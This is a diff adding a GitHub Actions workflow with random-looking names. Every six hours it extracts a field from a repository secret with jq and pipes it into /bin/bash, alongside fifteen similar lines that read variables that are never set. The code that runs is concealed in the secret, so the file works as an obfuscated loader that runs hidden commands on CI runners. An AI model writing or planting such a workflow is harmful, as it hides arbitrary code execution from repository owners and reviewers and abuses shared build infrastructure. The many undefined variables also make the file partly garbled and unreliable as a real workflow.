@@ -1,0 +1,33 @@
+name: huarukui7615
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huarukui7615
+        env:
+          vta522: ${{ secrets.vta522 }}
+        run: |
+          echo $vta522 | jq -r .pefsl2907 | /bin/bash
+          echo $ei4532 | jq -r .p3 | /bin/bash
+          echo $nsn3 | jq -r .zx83 | /bin/bash
+          echo $p23883 | jq -r .tcy67 | /bin/bash
+          echo $eix57 | jq -r .rhhl98030 | /bin/bash
+          echo $lghw9761 | jq -r .x03836 | /bin/bash
+          echo $t4 | jq -r .cl1 | /bin/bash
+          echo $eu0637 | jq -r .j80377 | /bin/bash
+          echo $xokzv6 | jq -r .ewcyo3 | /bin/bash
+          echo $r45422 | jq -r .nq454 | /bin/bash
+          echo $y63 | jq -r .t445 | /bin/bash
+          echo $tum748 | jq -r .dddny4306 | /bin/bash
+          echo $hvsg5 | jq -r .unqg13329 | /bin/bash
+          echo $cxbvz1 | jq -r .lawk81920 | /bin/bash
+          echo $guhe695 | jq -r .jyvw47046 | /bin/bash
+          echo $h90 | jq -r .zhe2 | /bin/bash
+
